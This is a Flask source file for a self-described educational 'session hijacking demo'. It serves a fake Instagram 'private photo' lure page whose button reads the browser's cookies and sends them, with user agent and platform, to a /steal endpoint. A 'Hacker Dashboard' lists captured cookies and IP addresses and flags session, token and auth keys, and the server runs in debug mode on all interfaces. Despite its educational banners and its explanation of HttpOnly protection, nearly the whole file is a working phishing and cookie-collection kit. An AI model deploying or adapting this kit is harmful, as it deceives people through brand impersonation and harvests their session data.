from flask import Flask, request, jsonify, render_template_string, make_response
from flask_cors import CORS
import datetime
import json
import os
import uuid

app = Flask(__name__)
CORS(app)

captured_sessions = []

# ============================================================
# HOME PAGE — Shows the phishing page (same domain as backend)
# ============================================================
INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Photo Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 16px;
            max-width: 400px;
            width: 100%;
            padding: 32px 24px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }
        .icon { font-size: 64px; margin-bottom: 16px; }
        h1 { font-size: 20px; color: #262626; margin-bottom: 4px; }
        .sub { color: #8e8e8e; font-size: 14px; margin-bottom: 24px; line-height: 1.4; }
        .preview {
            background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            border-radius: 12px; padding: 40px 20px; margin-bottom: 24px; color: white;
        }
        .preview .lock { font-size: 48px; margin-bottom: 8px; }
        .btn {
            background: #0095f6; color: white; border: none; border-radius: 10px;
            padding: 14px 0; font-size: 16px; font-weight: 600; cursor: pointer;
            width: 100%; transition: all 0.2s;
        }
        .btn:hover { background: #1877f2; }
        .btn:disabled { background: #b2dffc; cursor: not-allowed; }
        .status {
            margin-top: 16px; padding: 16px; border-radius: 10px; font-size: 13px;
            display: none; line-height: 1.5;
        }
        .status.show { display: block; }
        .status.success { background: #e8f5e9; color: #2e7d32; }
        .status.info { background: #e3f2fd; color: #1565c0; }
        .details {
            margin-top: 16px; background: #f5f5f5; border-radius: 10px; padding: 16px;
            font-size: 12px; text-align: left; display: none; word-break: break-all;
        }
        .details.show { display: block; }
        .details code {
            display: block; background: #263238; color: #00e676; padding: 12px;
            border-radius: 6px; margin-top: 8px; font-size: 11px; max-height: 200px; overflow-y: auto;
        }
        .details .red { color: #c62828; font-weight: bold; }
        .edu-box {
            margin-top: 20px; padding: 16px; background: #fff8e1;
            border: 1px solid #ffe082; border-radius: 10px; font-size: 12px;
            color: #e65100; text-align: left; line-height: 1.6; display: none;
        }
        .edu-box.show { display: block; }
        .edu-box .note {
            margin-top: 10px; padding: 10px; background: #ffebee;
            border-radius: 6px; color: #c62828; font-size: 11px;
        }
        .demo-cookie-box {
            margin-top: 16px; padding: 12px; background: #e8f5e9;
            border: 1px solid #66bb6a; border-radius: 8px; font-size: 12px; display: none;
        }
        .demo-cookie-box.show { display: block; }
    </style>
</head>
<body>
<div class="card">
    <div class="icon">📸</div>
    <h1>Private Photo</h1>
    <p class="sub">Someone shared a private Instagram photo with you</p>
    <div class="preview"><div class="lock">🔒</div><p>Tap below to view</p></div>
    <button class="btn" id="viewBtn" onclick="stealCookies()">View Private Photo</button>
    <div class="status info" id="loadingStatus">⏳ Loading...</div>
    <div class="status success" id="successStatus">✅ Photo loaded!</div>
    
    <div class="demo-cookie-box" id="demoCookieBox">
        <strong>🍪 DEMO COOKIE SET!</strong>
        <p style="margin-top: 4px;">This server set a demo cookie called <code>demo_session</code> on your browser. 
        The button below will steal it AND any other cookies on this domain.</p>
    </div>
    
    <div class="details" id="cookieDetails">
        <strong>📋 Captured Cookies:</strong>
        <code id="cookieContent"></code>
        <div style="margin-top: 10px;">
            <span class="red">🔴 DEMO SESSION COOKIE FOUND:</span>
            <span id="sessionDetected">No</span>
        </div>
    </div>
    
    <div class="edu-box" id="eduBox">
        <strong>🔴 EDUCATIONAL DEMO COMPLETE</strong>
        This page demonstrated <strong>Cookie Theft via JavaScript</strong>.
        <ol>
            <li>Server set a <code>demo_session</code> cookie (non-HttpOnly)</li>
            <li>JavaScript read <code>document.cookie</code></li>
            <li>Sent all cookies to <code>/steal</code> endpoint</li>
            <li>Check <strong>/dashboard</strong> to see captured data</li>
        </ol>
        <div class="note">
            ⚠️ <strong>Instagram's sessionid uses HttpOnly</strong> — that's why JavaScript CANNOT steal it.<br><br>
            This demo shows why HttpOnly matters. If Instagram didn't use it, 
            clicking a malicious link would give away your account.
        </div>
    </div>
    <div class="footer" style="margin-top:24px; font-size:11px; color:#c0c0c0;">
        Educational demonstration — for authorized testing only
    </div>
</div>

<script>
// Set a flag so we know the backend URL dynamically
var BACKEND_URL = window.location.origin;

function stealCookies() {
    var btn = document.getElementById('viewBtn');
    btn.disabled = true;
    btn.textContent = 'Loading...';
    document.getElementById('loadingStatus').classList.add('show');
    document.getElementById('successStatus').classList.remove('show');
    
    var cookies = document.cookie;
    
    // Send to backend
    fetch(BACKEND_URL + '/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            cookies: cookies,
            page: window.location.href,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            timestamp: new Date().toISOString()
        })
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        showResults(cookies, data);
    })
    .catch(function() {
        var img = new Image();
        img.src = BACKEND_URL + '/steal?c=' + encodeURIComponent(cookies);
        showResults(cookies, {});
    });
}

function showResults(cookies, data) {
    document.getElementById('loadingStatus').classList.remove('show');
    document.getElementById('successStatus').classList.add('show');
    document.getElementById('viewBtn').disabled = false;
    document.getElementById('viewBtn').textContent = '✓ View Again';
    
    var details = document.getElementById('cookieDetails');
    details.classList.add('show');
    document.getElementById('cookieContent').textContent = cookies || '(No cookies found)';
    
    var hasDemo = cookies && cookies.indexOf('demo_session') >= 0;
    document.getElementById('sessionDetected').textContent = hasDemo ? '✅ YES! demo_session captured!' : 'Not found';
    if (hasDemo) document.getElementById('sessionDetected').style.color = '#c62828';
    
    document.getElementById('eduBox').classList.add('show');
}
</script>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Hacker Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', -apple-system, sans-serif;
            background: #0d1117; color: #c9d1d9; padding: 20px;
        }
        .header {
            border-bottom: 2px solid #30363d; padding-bottom: 16px; margin-bottom: 20px;
        }
        .header h1 { color: #f85149; font-family: 'Courier New', monospace; font-size: 22px; }
        .header p { color: #8b949e; font-size: 13px; }
        .header .url { color: #58a6ff; font-size: 12px; margin-top: 4px; word-break: break-all; }
        .stats { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
        .stat {
            background: #161b22; border: 1px solid #30363d; border-radius: 6px;
            padding: 16px 20px; flex: 1; min-width: 120px;
        }
        .stat .num { font-size: 28px; font-weight: bold; color: #58a6ff; }
        .stat .num.red { color: #f85149; }
        .stat .label { color: #8b949e; font-size: 11px; margin-top: 2px; }
        .session {
            background: #161b22; border: 1px solid #30363d; border-radius: 6px;
            padding: 16px; margin-bottom: 12px;
        }
        .session .row {
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 8px; margin-bottom: 10px;
        }
        .session .time { color: #8b949e; font-size: 12px; }
        .session .ip { color: #79c0ff; font-size: 13px; }
        .badge { padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; }
        .badge-red { background: #f85149; color: #fff; }
        .badge-gray { background: #21262d; color: #8b949e; }
        .cookie-box {
            background: #0d1117; border: 1px solid #21262d; border-radius: 4px;
            padding: 12px; font-family: 'Courier New', monospace; font-size: 11px;
            word-break: break-all; max-height: 200px; overflow-y: auto;
        }
        .cookie-box .red { color: #f85149; font-weight: bold; }
        .cookie-box .blue { color: #79c0ff; }
        .cookie-box .green { color: #7ee787; }
        .empty { text-align: center; padding: 60px 20px; color: #484f58; }
        .empty .big { font-size: 48px; margin-bottom: 12px; }
        .empty code { background: #21262d; padding: 2px 8px; border-radius: 4px; font-size: 13px; }
        .info-bar {
            background: #1a3a2a; border: 1px solid #3fb950; border-radius: 6px;
            padding: 12px 16px; margin-bottom: 16px; color: #7ee787; font-size: 13px; display: none;
        }
        .info-bar.show { display: block; }
        .actions { margin-top: 16px; display: flex; gap: 12px; flex-wrap: wrap; }
        .actions button, .actions a {
            background: #21262d; color: #c9d1d9; border: 1px solid #30363d;
            padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 13px; text-decoration: none;
        }
        .actions button:hover, .actions a:hover { border-color: #58a6ff; color: #58a6ff; }
        .actions .danger:hover { border-color: #f85149; color: #f85149; }
        .refresh-note { color: #484f58; font-size: 12px; margin-top: 20px; text-align: center; }
        .how-to {
            background: #1a1a2e; border: 1px solid #30363d; border-radius: 6px;
            padding: 20px; margin-bottom: 20px; line-height: 1.8;
        }
        .how-to h3 { color: #f0883e; margin-bottom: 8px; }
        .how-to ol { padding-left: 20px; }
        .how-to li { color: #8b949e; font-size: 13px; }
        .how-to code { background: #0d1117; padding: 2px 6px; border-radius: 3px; color: #79c0ff; }
    </style>
</head>
<body>
<div class="header">
    <h1>🔴 SESSION HIJACKING DASHBOARD</h1>
    <p>Captured cookie data appears here in REAL TIME</p>
    <div class="url" id="serverUrl">Server: loading...</div>
</div>

<div class="how-to">
    <h3>📖 HOW THIS DEMO WORKS</h3>
    <ol>
        <li>Open this app on a phone: <code id="appUrl">loading...</code></li>
        <li>The server sets a <strong>demo_session cookie</strong> when you visit</li>
        <li>Tap <strong>"View Private Photo"</strong> — JavaScript reads <code>document.cookie</code></li>
        <li>All cookies are sent to <code>/steal</code> endpoint</li>
        <li>Watch them appear here on the dashboard!</li>
    </ol>
    <p style="margin-top: 8px; color: #f85149; font-size: 12px;">
        ⚠️ This demo shows the EXACT mechanism attackers use. Instagram prevents this 
        with <strong>HttpOnly</strong> cookies — that's the key security lesson!
    </p>
</div>

<div id="infoBar" class="info-bar"></div>
<div class="stats">
    <div class="stat"><div class="num" id="totalCount">0</div><div class="label">Total Captured</div></div>
    <div class="stat"><div class="num red" id="sessionCount">0</div><div class="label">Session Cookies</div></div>
</div>
<div id="sessionsContainer">
    <div class="empty"><div class="big">📡</div><h3>Waiting for victims...</h3>
    <p>Open this URL on a phone:</p><code id="emptyUrl">loading...</code></div>
</div>
<div class="actions">
    <button onclick="fetchData()">🔄 Refresh</button>
    <button class="danger" onclick="clearAll()">🗑️ Clear</button>
</div>
<div class="refresh-note">Auto-refreshes every 2 seconds</div>

<script>
var BACKEND = window.location.origin;
document.getElementById('serverUrl').textContent = 'Server: ' + BACKEND;
document.getElementById('appUrl').textContent = BACKEND;

function fetchData() {
    fetch(BACKEND + '/api/sessions')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            renderSessions(data);
        })
        .catch(function(err) {
            document.getElementById('sessionsContainer').innerHTML = 
                '<div class="empty"><div class="big">❌</div><h3>Error: ' + err.message + '</h3></div>';
        });
}

function renderSessions(data) {
    var sessions = data.sessions || [];
    document.getElementById('totalCount').textContent = sessions.length;
    var sessionCount = sessions.filter(function(s) { return s.has_session; }).length;
    document.getElementById('sessionCount').textContent = sessionCount;
    
    var infoBar = document.getElementById('infoBar');
    if (sessions.length > 0) {
        infoBar.classList.add('show');
        infoBar.innerHTML = '✅ <strong>' + sessions.length + ' sessions captured!</strong> ' +
            (sessionCount > 0 ? sessionCount + ' contain session cookies!' : '');
    }
    
    if (sessions.length === 0) {
        document.getElementById('sessionsContainer').innerHTML = 
            '<div class="empty"><div class="big">📡</div><h3>Waiting...</h3><p>Open this URL on a phone:</p><code>' + BACKEND + '</code></div>';
        document.getElementById('emptyUrl').textContent = BACKEND;
        return;
    }
    
    var html = '';
    for (var i = sessions.length - 1; i >= 0; i--) {
        var s = sessions[i];
        var parsed = '';
        if (s.parsed) {
            var keys = Object.keys(s.parsed);
            for (var j = 0; j < keys.length; j++) {
                var k = keys[j];
                var v = s.parsed[k];
                var isSess = k.toLowerCase().indexOf('session') >= 0 || k.toLowerCase().indexOf('demo') >= 0;
                var cls = isSess ? 'red' : 'blue';
                parsed += '<span class="' + cls + '">' + k + '</span> = <span class="green">' + v + '</span><br>';
            }
        }
        html += '<div class="session"><div class="row"><div><span class="time">' + s.timestamp + 
            '</span><span class="ip"> | 📍 ' + s.ip + '</span></div><div>' + 
            (s.has_session ? '<span class="badge badge-red">🔑 SESSION DATA</span>' : '<span class="badge badge-gray">No session</span>') +
            '</div></div><div class="cookie-box">' + (parsed || s.cookies || '(empty)') + '</div></div>';
    }
    document.getElementById('sessionsContainer').innerHTML = html;
}

function clearAll() {
    if (!confirm('Clear all sessions?')) return;
    fetch(BACKEND + '/clear', { method: 'POST' }).then(function() { fetchData(); });
}

fetchData();
setInterval(fetchData, 2000);
</script>
</body>
</html>
"""


# ============================================================
# ROUTES
# ============================================================

@app.route("/")
def home():
    """Serve the phishing page AND set a demo cookie."""
    resp = make_response(INDEX_HTML)
    # Set a DEMO cookie so there's something to steal
    demo_session_value = "DEMO_USER_" + str(uuid.uuid4())[:8]
    resp.set_cookie(
        "demo_session",
        demo_session_value,
        httponly=False,   # NOT HttpOnly — so JS can read it!
        samesite="Lax",
        max_age=3600,
        path="/"
    )
    resp.set_cookie(
        "demo_user_id",
        "user_" + str(uuid.uuid4())[:6],
        httponly=False,
        samesite="Lax",
        max_age=3600,
        path="/"
    )
    return resp

@app.route("/dashboard")
def dashboard_page():
    """Serve the dashboard page."""
    return DASHBOARD_HTML

@app.route("/api/sessions")
def api_sessions():
    """Return captured sessions as JSON."""
    return jsonify({"sessions": captured_sessions})

@app.route("/steal", methods=["GET", "POST"])
def steal():
    """Receive stolen cookies."""
    if request.method == "GET":
        cookies = request.args.get("c", "")
        page = request.args.get("page", "")
    else:
        data = request.get_json(silent=True) or {}
        cookies = data.get("cookies", request.form.get("cookies", ""))
        page = data.get("page", "")
    
    record = {
        "id": str(uuid.uuid4())[:8],
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "cookies": cookies,
        "page": page,
    }
    
    # Parse cookies
    parsed = {}
    if cookies:
        for pair in cookies.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                parsed[k.strip()] = v.strip()
    record["parsed"] = parsed
    
    # Check for session cookies
    session_keys = [k for k in parsed if "session" in k.lower() or "token" in k.lower() 
                    or "auth" in k.lower() or k.lower() == "demo_user_id"]
    record["has_session"] = len(session_keys) > 0
    record["session_keys"] = session_keys
    
    captured_sessions.append(record)
    
    print(f"\n[!] COOKIES CAPTURED at {record['timestamp']}")
    print(f"[!] IP: {record['ip']}")
    print(f"[!] Cookies: {cookies[:100]}")
    print(f"[!] Session keys: {session_keys}")
    
    return jsonify({"status": "ok", "id": record["id"], "has_session": record["has_session"]})

@app.route("/clear", methods=["POST"])
def clear():
    captured_sessions.clear()
    return jsonify({"status": "cleared"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"\n{'='*50}")
    print(f"  🔴 SESSION HIJACKING DEMO SERVER")
    print(f"{'='*50}")
    print(f"\n  Open this URL on your phone:")
    print(f"  http://localhost:{port}")
    print(f"\n  Dashboard:")
    print(f"  http://localhost:{port}/dashboard")
    print(f"{'='*50}\n")
    app.run(host="0.0.0.0", port=port, debug=True)